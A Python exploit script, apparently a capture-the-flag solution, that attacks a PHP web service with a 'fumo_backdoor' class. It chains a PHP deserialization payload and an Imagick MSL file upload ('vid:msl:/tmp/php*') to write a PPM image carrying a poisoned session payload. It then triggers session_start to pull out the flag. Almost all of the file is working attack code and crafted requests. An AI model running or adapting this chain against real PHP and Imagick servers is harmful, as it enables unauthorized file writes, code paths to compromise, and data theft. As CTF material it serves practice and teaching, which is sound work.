#!/usr/bin/python3
#coding:utf-8

import sys
import time
import requests
from ctfbox import base64_encode

payload = '|O:13:"fumo_backdoor":4:{s:4:"path";s:9:"/tmp/ttt1";s:4:"argv";N;s:4:"func";N;s:5:"class";N;}'
size = (len(payload) // 3) + 1

filled_payload = payload.rjust(size * 3, '\0')

img = f"""P6
{str(size)} 1
255
{filled_payload}"""

b64_img = base64_encode(img)


host = sys.argv[1]
port = sys.argv[2]

url = f"http://{host}:{port}"

def rm_tmp_file():
    headers = {"Accept": "*/*"}
    requests.get(
        f"{url}/?cmd=rm",
        headers=headers
    )

def upload_session_and_read_file(msl_file):
    headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
    }

    data = f"--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n{msl_file}\r\n--------------------------c32aaddf3d8fd979--"
    try:
        res = requests.post(
            f"{url}/?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22imagick%22%3B%7D&cmd=unserialze",
            headers=headers, data=data
        )
        print(res.text)
    except requests.exceptions.ConnectionError:
        pass

def get_flag():
    cookies = {"PHPSESSID": "afkl"}
    headers = {"Accept": "*/*"}
    res = requests.get(
        f"{url}/?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Ftest1%22%3Bs%3A4%3A%22argv%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3BN%3B%7D&cmd=unserialze", 
        headers=headers, cookies=cookies
    )
    return res.text.encode().replace(b'\0', b'')

# 主逻辑
if __name__ == '__main__':
    with open("./img.msl", "r") as fp:
        msl_file = fp.read()
    
    # upload_session_and_read_file(msl_file.format(img_size=1))

    for i in range(5, 6):
        rm_tmp_file()
        n_msl_file = msl_file.format(img_size=i, ppm_data=b64_img)
        
        time.sleep(5)
        upload_session_and_read_file(n_msl_file)

        # time.sleep(5)

        print("=" * 20)
        print(f"try: {i} times")
        print(get_flag())        
        print("=" * 20)

        time.sleep(5)
